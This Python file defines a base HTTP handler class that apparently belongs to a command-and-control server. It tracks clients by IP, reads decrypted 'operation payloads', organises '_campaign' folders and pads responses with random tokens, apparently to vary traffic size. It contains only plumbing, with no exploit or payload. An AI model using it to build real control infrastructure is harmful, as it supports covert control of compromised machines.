import os
import logging
import json

logger = logging.getLogger(__name__)

class BaseHandler:
    """Base class for all endpoint handlers with common functionality"""
    
    def __init__(self, request_handler, client_manager, crypto_helper, client_helper, path_router):
        """
        Initialize the base handler
        
        Args:
            request_handler: The HTTP request handler instance
            client_manager: Client manager for tracking clients
            crypto_helper: Helper for encryption/decryption
            client_helper: Helper for client operations
            path_router: Path router for URL handling
        """
        self.request_handler = request_handler
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.client_helper = client_helper
        self.path_router = path_router
        
        # Access client_address directly from the handler
        # This attribute should be available since do_GET/do_POST is called after setup
        self.client_address = getattr(request_handler, 'client_address', ('Unknown', 0))
        
        # Get headers and server from request_handler if available
        if hasattr(request_handler, 'headers'):
            self.headers = request_handler.headers
        else:
            # Create a dummy headers object if not available
            class DummyHeaders:
                def get(self, name, default=None):
                    return default
            self.headers = DummyHeaders()
            
        self.server = request_handler.server
        
    def log_message(self, message):
        """Log a message with client IP"""
        logger.info(f"{self.client_address[0]} - {message}")
    
    def send_response(self, status_code, content_type, content, headers=None):
        """
        Send HTTP response with standard headers
        
        Args:
            status_code: HTTP status code
            content_type: Content type for the response
            content: Response body content
            headers: Additional headers dict (optional)
        """
        self.request_handler.send_response(status_code)
        self.request_handler.send_header("Content-type", content_type)
        
        # Add common cache control headers used by web servers
        self.request_handler.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.request_handler.send_header("Pragma", "no-cache")
        self.request_handler.send_header("Expires", "0")
        
        # Add any additional headers
        if headers:
            for key, value in headers.items():
                self.request_handler.send_header(key, value)
                
        self.request_handler.end_headers()
        
        # Send content
        if isinstance(content, str):
            content = content.encode("utf-8")
        self.request_handler.wfile.write(content)
    
    def send_success_response(self, additional_headers=None):
        """Send a standard success response"""
        headers = additional_headers or {}
        self.send_response(200, "text/plain", b"OK", headers)
    
    def send_error_response(self, status_code=500, message="Server Error"):
        """Send an error response"""
        self.send_response(status_code, "text/plain", message)
    
    def get_campaign_folder(self):
        """Get the current campaign folder path"""
        campaign_name = getattr(self.request_handler, 'campaign_name', None)
        
        if not campaign_name:
            # Try to find campaign directories
            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
            if campaign_dirs:
                campaign_name = campaign_dirs[0][:-9]  # Remove "_campaign" suffix
            else:
                campaign_name = "default"
        
        return f"{campaign_name}_campaign"
    
    def get_operation_payload(self):
        """Get the operation payload from the decrypted data"""
        if hasattr(self.request_handler, 'decrypted_payload'):
            return self.request_handler.decrypted_payload
        return None
    
    def _identify_client_by_ip(self):
        """Identify client based on IP address as fallback"""
        client_ip = self.client_address[0]
        for client_id, client_info in self.client_manager.get_clients_info().items():
            if client_info.get('ip') == client_ip:
                return client_id
        return None

    def _generate_token_padding(self):
        """Generate random token padding for responses"""
        import random
        import string
        
        # Generate a random length between 50 and 500 characters
        padding_length = random.randint(50, 500)
        
        # Generate random padding content
        chars = string.ascii_letters + string.digits
        padding = ''.join(random.choice(chars) for _ in range(padding_length))
        
        return padding